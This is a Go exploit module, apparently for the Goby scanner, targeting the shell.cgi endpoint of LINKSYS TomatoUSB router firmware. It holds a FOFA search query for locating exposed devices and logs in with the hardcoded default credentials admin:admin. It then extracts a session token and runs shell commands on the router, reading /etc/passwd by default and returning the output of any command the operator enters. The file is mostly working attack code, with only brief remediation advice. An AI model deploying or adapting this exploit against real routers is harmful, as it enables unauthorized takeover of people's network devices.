package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LINKSYS TomatoUSB shell.cgi api RCE",
    "Description": "<p>Tomato USB is an alternative Linux-based firmware for powering Broadcom-based ethernet routers. It is a modification of the famous Tomato firmware, with additional built-in support for USB port, wireless-N mode support, support for several newer router models, and various enhancements.</p><p>Login the LINKSYS TomatoUSB router</p><p>by defacult username and password（admin:admin）</p><p>Execute System Commands</p>",
    "Impact": "<p>LINKSYS TomatoUSB shell.cgi RCE</p>",
    "Recommendation": "<p>1. Change the administrator password in a timely manner</p><p>2. Prohibit the public network from accessing the device</p><p>3. Update the latest system in time</p>",
    "Product": "LINKSYS TomatoUSB",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "LINKSYS TomatoUSB 路由器 shell.cgi 接口后台命令执行漏洞",
            "Product": "LINKSYS TomatoUSB",
            "Description": "<p>Tomato USB是一种基于linux的替代固件，用于为基于broadcom的以太网路由器供电。它是著名的Tomato固件的一个修改，具有额外的内置支持USB端口，无线n模式支持，支持几种较新的路由器型号，以及各种增强功能。<br></p><p>LINKSYS TomatoUSB路由器登陆后，默认账号（admin:admin），执行命令<br></p>",
            "Recommendation": "<p>1、及时修改管理员密码</p><p>2、禁止公网访问设备</p><p>3、及时升级最新系统</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">可以通过默认口令登录设备</span></span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">执行命令，反弹shell等危险操作</span><br></span></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "LINKSYS TomatoUSB shell.cgi api RCE",
            "Product": "LINKSYS TomatoUSB",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Tomato USB is an alternative Linux-based firmware for powering Broadcom-based ethernet routers. It is a modification of the famous Tomato firmware, with additional built-in support for USB port, wireless-N mode support, support for several newer router models, and various enhancements.<br></span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Login the LINKSYS TomatoUSB router</span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">by defacult username and password（admin:admin）</span></p><p><span style=\"color: rgb(64, 80, 128); font-size: 18px;\">Execute System Commands</span><br></p>",
            "Recommendation": "<p>1. Change the administrator password in a timely manner</p><p>2. Prohibit the public network from accessing the device</p><p>3. Update the latest system in time</p>",
            "Impact": "<p>LINKSYS TomatoUSB shell.cgi RCE</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"TomatoUSB\" || header=\"TomatoUSB\"",
    "GobyQuery": "banner=\"TomatoUSB\" || header=\"TomatoUSB\"",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "http://tomatousb.org/",
    "DisclosureDate": "2022-03-25",
    "References": [
        "https://fofa.info/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10359"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGetone := httpclient.NewGetRequestConfig("/")
			cfgGetone.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGetone.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
			cfgGetone.FollowRedirect = false
			cfgGetone.VerifyTls = false
			if respOne, err := httpclient.DoHttpRequest(u, cfgGetone); err == nil {
				if respOne.StatusCode == 200 && strings.Contains(respOne.Utf8Html, "http_id=") {
					httpId := regexp.MustCompile(`(?s)http_id=(.*?)'`).FindStringSubmatch(respOne.RawBody)[1]
					vlurl := "/shell.cgi?action=execute&command=cat+/etc/passwd&_http_id=" + httpId
					cfgGet := httpclient.NewGetRequestConfig(vlurl)
					cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfgGet.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
					cfgGet.FollowRedirect = false
					cfgGet.VerifyTls = false
					if resp, err := httpclient.DoHttpRequest(u, cfgGet); err == nil {
						return strings.Contains(resp.Utf8Html, "root:") && strings.Contains(resp.Utf8Html, ":/bin/sh")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmdEn := url.QueryEscape(fmt.Sprintf("%s", cmd))
			cfgGetone := httpclient.NewGetRequestConfig("/")
			cfgGetone.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGetone.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
			cfgGetone.FollowRedirect = false
			cfgGetone.VerifyTls = false
			respOne, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfgGetone)
			if respOne.StatusCode == 200 && strings.Contains(respOne.Utf8Html, "http_id=") {
				httpId := regexp.MustCompile(`(?s)http_id=(.*?)'`).FindStringSubmatch(respOne.RawBody)[1]
				vlurl := "/shell.cgi?action=execute&command=" + cmdEn + "&_http_id=" + httpId
				cfgGet := httpclient.NewGetRequestConfig(vlurl)
				cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfgGet.Header.Store("Authorization", "Basic YWRtaW46YWRtaW4=")
				cfgGet.FollowRedirect = false
				cfgGet.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet); err == nil {
					expResult.Success = true
					cmdresult := regexp.MustCompile(`cmdresult = '(.*?)'`).FindStringSubmatch(resp.RawBody)[1]
					out := strings.Replace(cmdresult, "\\x0a", "\n", -1)
					expResult.Output = out
				}
			}
			return expResult
		},
	))
}
